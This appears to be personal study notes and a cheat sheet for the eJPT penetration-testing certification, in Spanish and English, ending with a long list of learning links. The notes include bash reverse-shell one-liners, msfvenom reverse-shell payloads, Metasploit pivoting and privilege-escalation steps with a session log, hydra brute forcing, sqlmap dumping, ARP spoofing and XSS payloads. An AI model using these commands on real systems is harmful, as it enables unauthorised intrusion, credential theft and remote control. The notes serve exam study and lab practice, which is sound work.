---
description:
---

**Information gathering:**

Esta etapa se centra en recopilar información, existe active y pasive information gathering.
- La etapa pasiva se refiere a recopilar información que puedes encontrar en google como contraseñas por default de las tecnologías que usan, etc. 
- La recopilación activa va enfocada en investigar nuestro objetivo con escaneos, análisis a la infraestructura, etc.

Como parte del análisis pasivo podemos investigar la dirección ip de nuestro objetivo, dominios, subdominios, DNS, correos, redes sociales, tecnologías web, subdirectorios.

Como parte del análisis activo encontrarás puertos abiertos en el dominio, infraestructura interna de la organización, enumeración de sistemas vulnerables. 

El comando ``` host ``` podemos ver si hay un DNS o un firewall de por medio y nos mostrará la dirección ip directa de servidor. 

En el buscador podemos agregar el subdirectorio ```/robots.txt```, esto nos mostrará la información del dominio que se solicita por parte del host que no sea indexada en internet por lo que mostrará información potencial de dominios ocultos que pueden haber en el sitio.

El ```sitemap.xml``` nos muestra información similar al robots con links y páginas a las que se pueden acceder públicamente.

Con la extensión ```BuiltWith``` podemos ver las tecnologías como plugins y frameworks que utilizan las plataformas así como subdominios asociados a la página.

```Wappalyzer``` también nos permite ver que tecnologías usa la página, aun que por el contrario podemos usar la versión en la terminal con el comando ```whatweb```

Con la plataforma ```httrack``` podemos clonar páginas web en nuestro directorio local con la finalidad de analizar a profundidad y con más comodidad el contenido del código fuente de los sitios web. ```sudo apt-get install webhttrack```

Con ```whois``` podemos ver la información del dueño de un dominio tanto con el url como con la dirección ip

La página ```netcraft``` te puede ayudar a escanear la red del dominio que quieres vulnerar, también te dirá el tiempo que tiene su certificado, si tiene vulnerabilidades de tipo SSL cert, etc.

La herramienta ```dnsrecon``` te ayuda a escanear el dns de la plataforma a vulnerar, viene preinstalada en kali linux, nos va a mostrar el server address, también nos permite ver el servicio mail que utiliza el sistema. 

DNS dumpster.com es una herramienta que nos ayuda a analizar el DNS, nos muestra el proveedor del firewall, nos ayuda a trackear una ip, que otro sitios usan el mismo DNS, etc. Así mismo nos muestra una representación gráfica de cómo está montada la arquitectura del servidor a vulnerar.

Un WAF es un Web Application Firewall, con ```wafw00f``` podemos detectar si una aplicación está protegida por un proxy server o un firewall, así como ver si este realmente funciona o no.

Para buscar subdominios podemos usar sublist3r, está programado en python y nos ayuda  a enumerar subdominios, esta herramienta también admite fuerza bruta con la herramienta subbrute.

Con google dorks una de las funciones más explotables es 

```
intitle:index of
cache:
```

waybackmachine toma backups de los sitios web.

theHarvester nos ayuda a encontrar data leakeada, así mismo con have i been pwned nos ayudará a ver si hay contraseñas para esos correos leakeados.

La herramienta dnsrecon y dnsenum nos ayuda a enumerar servidores DNS para un dominio que especifiquemos.

La herramienta Responder nos ayuda a ver el smbrelay hash de autenticación 

Permisos root
```
find / -perm -4000 2>/dev/null
```

Pivot
```
sshuttle -r usuario@ip 0.0.0.0/24
```

Fuerza bruta
```
hydra -l usuario -P wordlist rockyou recomendable protocolo://ip
```

SSH sin passwd de user
```
cp id_rsa.pub authorized_keys
```


METASPLOIT PIVOTING

```
msfconsole

search /multi/handler

use /multi/handler

show options

set LHOST ip atacante

set PAYLOAD linux/x86/meterpreter/reverse_tcp #esto fija un meterpreter

run
```

En la máquina victima:

```
bash -i >& /dev/tcp/<ip>/<puerto> 0>&1
```

En metasploit> ```ipconfig```

```
control + z 
2

route add <ip> <mascaradesubred> 2
sessions -l
sessions -i 2
portfwd add -l 5000 -p 80 -r <ip>
```

localhost en el puerto del port forwarding

Antique
port 23 telnet ip puerto

snmpwalk -c -v2c ip

```
bash -c "bash -i >& /dev/tcp/<ip>/<puerto> 0>&1"
```

pkexec pwnkit
gcc dirtypipe
xsser --url "web" -p "variable=XSS&variable+XSS" | --auto | --Fp "<script>alert(1)</script>"

https://methodological-notes.gitbook.io/ejptv2-preparation/


# eJPT-Cheatsheet

## Command Cheetsheet:

### Nmap

nmap -sn 10.10.10.0/24\
nmap -sV -p- -iL targets -oN nmap.initial -v\
nmap -A -p- -iL targets -oN nmap.aggressive -v\
nmap -p --script=vuln -v

### fPing

fping -a -g 10.10.10.0/24 2>/dev/null > targets

### IP Route

**Syntax**\
ip route add \<Network-range> via \<router-IP> dev \<interface>\
eg.\
ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0

### John

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5\
unshadow passwd shadow > unshadowed.txt\
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

### dirb

dirb [http://10.10.10.10/](http://10.10.10.10/)\
dirb [http://10.10.10.10/dir](http://10.10.10.10/dir) -u admin:admin

_I suggest you to use dirbuster for better speed. Keep the threads at 20. Use /usr/share/wordlists/dirb/common.txt wordlist._

### Netcat

**Listening for reverse shell**\
nc -nvlp 1234

**Banner Grabbing**\
nc -nv 10.10.10.10 \<port>

### SQLMap

**Check if injection exists**

sqlmap -r Post.req\
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id\
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin\&password=admin"

**Get database if injection Exists**

sqlmap -r login.req --dbs\
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id --dbs\
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin\&password=admin" --dbs\\

**Get Tables in a Database**

sqlmap -r login.req -D dbname --tables\
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id -D dbname --tables\
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin\&password=admin" -D dbname --tables

**Get data in a Database tables**

sqlmap -r login.req -D dbname -T table\_name --dump\
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id -D dbname -T table\_name --dump\
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin\&password=admin" -D dbname -T table\_name --dump

### Hydra

**SSH Login Bruteforcing**\
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
_You can use same for FTP, just replace ssh with ftp_

**HTTP POST Form**\
hydra [http://10.10.10.10/](http://10.10.10.10/) http-post-form "/login.php:user=^USER^\&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V

_You will know which wordlists to use when the time comes_

### XSS

\<script>alert(1)\</script>\
\<ScRiPt>alert(1)\</ScRiPt>

_This is a great filter bypass cheatsheet_\
[https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### msfvenom shells

**JSP Java Meterpreter Reverse TCP**\
msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST= LPORT= -f raw > shell.jsp

**WAR**\
msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST= LPORT= -f war > shell.war

**PHP**\
msfvenom -p php/meterpreter\_reverse\_tcp LHOST= LPORT= -f raw > shell.php\
cat shell.php | pbcopy && echo '\<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

### Metasploit Meterpreter autoroute

run autoroute -s 10.10.10.0/24

### ARPSpoof

echo 1 > /proc/sys/net/ipv4/ip\_forward\
arpspoof -i -t -r\
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36

### SMB Enumeration

**Get shares, users, groups, password policy**\
smbclient -L //10.10.10.10/\
enum4linux -U -M -S -P -G 10.10.10.10\
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -v\
nmap -p445 --script=smb-vuln-\* 10.10.10.10 -v

**Access Share**\
smbclient //10.10.10.10/share\_name

### FTP Enumeration

nmap --script=ftp-anon 10.10.10.10 -p21 -v\
nmap -A -p21 10.10.10.10 -v

**Login to FTP server**\
ftp 10.10.10.10

### Meterpreter

ps\
getuid\
getpid\
getsystem\
ps -U SYSTEM

**CHECK UAC/Privileges**\
run post/windows/gather/win\_privs

**BYPASS UAC**\
_Background the session first_\
exploit/windows/local/bypassuac\
set session

**After PrivEsc**\
migrate \<pid>\
hashdump

### Windows Command Line

**To search for a file starting from current directory**\
dir /b/s "\*.conf\*"\
dir /b/s "\*.txt\*"\
dir /b/s "\*filename\*"

**Check routing table**\
route print\
netstat -r

**Check Users**\
net users

**List drives on the machine**\
wmic logicaldisk get Caption,Description,providername
## Notes:

* [https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/](https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/)
* [https://github.com/d3m0n4l3x/eJPT](https://github.com/d3m0n4l3x/eJPT)
* [https://github.com/tr0nucf/My-Tools/blob/master/eJPT%20Notes.txt](https://github.com/tr0nucf/My-Tools/blob/master/eJPT%20Notes.txt)
* [https://github.com/fdicarlo/eJPT](https://github.com/fdicarlo/eJPT)
* [https://github.com/Kaiser784/eJPT](https://github.com/Kaiser784/eJPT)

## External Resources:

```
Mayur Parmar(th3cyb3rc0p)

Social Media Handles:
Linkedin:
https://www.linkedin.com/in/th3cyb3rc0p/
Twitter:
https://twitter.com/th3cyb3rc0p
Instagram:
https://www.instagram.com/th3cyb3rc0p/

Note: all credit goes to respected authors.  
```
### Notes:

[https://massive-starburst-e68.notion.site/course-PTSv4-22ad4ca2ce3e4fe0a5e369217b41c9b3](https://massive-starburst-e68.notion.site/course-PTSv4-22ad4ca2ce3e4fe0a5e369217b41c9b3)
### Resources:

All in one playlist:

https://www.youtube.com/playlist?list=PLLKT\_\_MCUeiyxF54dBIkzEXT7h8NgqQUB

https://www.youtube.com/watch?v=qlK174d\_uu8\&list=PLLKT\_\_MCUeiwBa7d7F\_vN1GUwz\_2TmVQj

https://www.youtube.com/playlist?list=PLLKT\_\_MCUeiwfK18Io6kvwrrhqQyQnV5W

https://www.youtube.com/watch?v=4Kho3Eeyx1U\&list=PLLKT\_\_MCUeiyUKmYaakznsZeU4lZYwt\_j
### Prerequisites:

https://www.hackingarticles.in/wireshark-for-pentesters-a-beginners-guide/

https://www.hackingarticles.in/beginner-guide-cryptography-part-1/

https://www.hackingarticles.in/beginner-guide-classic-cryptography/

https://github.com/Ignitetechnologies/BurpSuite-For-Pentester

https://www.hackingarticles.in/beginner-guide-understand-cookies-session-management/

https://www.hackingarticles.in/comprehensive-guide-on-broken-authentication-session-management/

https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/

https://www.javatpoint.com/computer-network-routing

https://www.geeksforgeeks.org/types-of-routing/
### Programming:

C++:https://www.tutorialspoint.com/cplusplus/index.htm

python: https://www.youtube.com/watch?v=gfDE2a7MKjA (Hindi)

python: https://www.youtube.com/watch?v=WGJJIrtnfpk (English)

Bash scripting: https://www.youtube.com/playlist?list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZT

\


### Penetration Testing Basics:

#### OSINT:

https://osintframework.com/

https://portswigger.net/daily-swig/osint-what-is-open-source-intelligence-and-how-is-it-used

\
\


#### Subdomain enumeration:

https://medium.com/@\_ncpd/subdomain-enumeration-made-easy-ba843037ab76

https://medium.com/@polihenko.o/subdomain-enumeration-penetration-testing-60a0c0e58d3a

https://medium.com/@edu4rdshl/subdomains-enumeration-what-is-how-to-do-it-monitoring-automation-using-webhooks-and-5e0a0c6d9127

\


#### Nmap:

[https://github.com/Ignitetechnologies/Nmap-For-Pentester](https://github.com/Ignitetechnologies/Nmap-For-Pentester)

\


#### Masscan:

https://resources.infosecinstitute.com/topic/masscan-scan-internet-minutes/

\


#### Nessus:

https://www.youtube.com/watch?v=vlGm80hj9c4 (Hindi)

\


#### Netcat:

https://www.hackingarticles.in/netcat-for-pentester/

\


#### Dirbuster:

https://www.hackingarticles.in/comprehensive-guide-on-dirbuster-tool/

https://www.hackingarticles.in/5-ways-directory-bruteforcing-web-server/

\


#### Cross-site scripting(Xss):

https://www.hackingarticles.in/comprehensive-guide-on-cross-site-scripting-xss/

https://www.hackingarticles.in/cross-site-scripting-exploitation/

\


#### SQL injection:

https://www.hackingarticles.in/beginner-guide-sql-injection-part-1/

https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/

https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/

https://www.hackingarticles.in/form-based-sql-injection-manually/

https://www.hackingarticles.in/exploiting-form-based-sql-injection-using-sqlmap/

https://www.hackingarticles.in/bypass-filter-sql-injection-manually/

https://www.hackingarticles.in/exploiting-sql-injection-nmap-sqlmap/

\


#### Sqlmap:

https://www.hackingarticles.in/exploiting-sql-injection-nmap-sqlmap/

https://www.hackingarticles.in/comprehensive-guide-to-sqlmap-target-options15249-2/

\


#### John the Ripper:

https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/

https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/

https://www.csoonline.com/article/3564153/john-the-ripper-explained-an-essential-password-cracker-for-your-hacker-toolkit.html

\


#### Hashcat:

https://www.hackers-arise.com/post/2016/05/26/cracking-passwords-with-hashcat

https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/

https://miloserdov.org/?p=5426

\


#### Hydra:

https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/

\


#### Null session attack:

https://www.dummies.com/programming/networking/null-session-attacks-and-how-to-avoid-them/

\


#### Metasploit:

https://www.tutorialspoint.com/metasploit/index.htm

https://www.youtube.com/watch?v=8lR27r8Y\_ik\&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm

\


#### Wordlist:

https://www.hackingarticles.in/wordlists-for-pentester/

\


### TryHackME Rooms:

(P): indicates need paid subscription of tryhackme\


#### Fundamentals:

https://tryhackme.com/room/bpnetworking

https://tryhackme.com/room/hackermethodology

https://tryhackme.com/room/howwebsiteswork

https://tryhackme.com/room/passwordsecurity

https://tryhackme.com/room/cryptographyfordummies

https://tryhackme.com/room/introtonetworking

https://tryhackme.com/room/webfundamentals

https://tryhackme.com/room/networkservices

https://tryhackme.com/room/networkservices2

\


#### Linux:

https://tryhackme.com/room/linux1

https://tryhackme.com/room/linux2

https://tryhackme.com/room/linux3

https://tryhackme.com/room/linuxbackdoors

https://tryhackme.com/room/linuxagency

https://tryhackme.com/room/linuxmodules

https://tryhackme.com/room/linuxstrengthtraining

\


#### Tools:

https://tryhackme.com/room/openvas

https://tryhackme.com/room/rustscan

https://tryhackme.com/room/furthernmap

https://tryhackme.com/room/rpnessusredux

https://tryhackme.com/room/learnowaspzap

https://tryhackme.com/room/rpburpsuite (P)

\


#### Programming:

https://tryhackme.com/room/bashscripting

https://tryhackme.com/room/rust

https://tryhackme.com/room/javascriptbasics

https://tryhackme.com/room/scripting (P)

https://tryhackme.com/room/introtopython (P)

https://tryhackme.com/room/intropocscripting

\


#### Privillage escalation:

https://tryhackme.com/room/windows10privesc

https://tryhackme.com/room/windowsprivescarena

https://tryhackme.com/room/linuxprivesc

https://tryhackme.com/room/linuxprivescarena

https://tryhackme.com/room/persistence (P)

https://tryhackme.com/room/commonlinuxprivesc

https://tryhackme.com/room/binex (P)

https://tryhackme.com/room/postexploit

\


#### Cryptography:

https://tryhackme.com/room/johntheripper0 (P)

https://tryhackme.com/room/crackthehash

https://tryhackme.com/room/crackthehashlevel2

https://tryhackme.com/room/hashingcrypto101

\


#### Web attacks:

https://tryhackme.com/room/sqlilab

https://tryhackme.com/room/owasptop10

https://tryhackme.com/room/owaspmutillidae

https://tryhackme.com/room/xss (P)

https://tryhackme.com/room/uploadvulns (P)

https://tryhackme.com/room/sqlibasics (P)

https://tryhackme.com/room/owaspjuiceshop (P)

https://tryhackme.com/room/webenumerationv2 (P)

https://tryhackme.com/room/rpwebscanning

https://tryhackme.com/room/googledorking

https://tryhackme.com/room/bruteit

https://tryhackme.com/room/webosint

https://tryhackme.com/room/introtoresearch

https://tryhackme.com/room/introtoshells

https://tryhackme.com/room/bolt

```
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/always_install_elevated  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> run
[*] Started reverse TCP handler on 10.10.14.10:4444
[*] Uploading the MSI to C:\Users\pmorgan\AppData\Local\Temp\fbwGXm.msi ...
[*] Executing MSI...
[*] Sending stage (175686 bytes) to 10.13.38.15
[+] Deleted C:\Users\pmorgan\AppData\Local\Temp\fbwGXm.msi
[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.13.38.15:54617)

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 2)(C:\Windows\system32) >

```


#### Misc:

https://tryhackme.com/room/h4cked

https://tryhackme.com/room/dnsmanipulation

https://tryhackme.com/room/wekorra

https://tryhackme.com/room/mitre

https://tryhackme.com/room/vulnversity

https://tryhackme.com/room/poster

https://tryhackme.com/room/relevant

https://tryhackme.com/room/adventofcyber2

https://tryhackme.com/room/marketplace

\


#### Paid(required tryhackme premium subscription):

https://tryhackme.com/room/lle

https://tryhackme.com/room/wireshark

https://tryhackme.com/room/gamezone

https://tryhackme.com/room/eritsecurusi

\


### Course Review:

[https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/](https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/)

[https://kentosec.com/2019/08/04/elearnsecurity-junior-penetration-tester-ejpt-course-review/](https://kentosec.com/2019/08/04/elearnsecurity-junior-penetration-tester-ejpt-course-review/)

\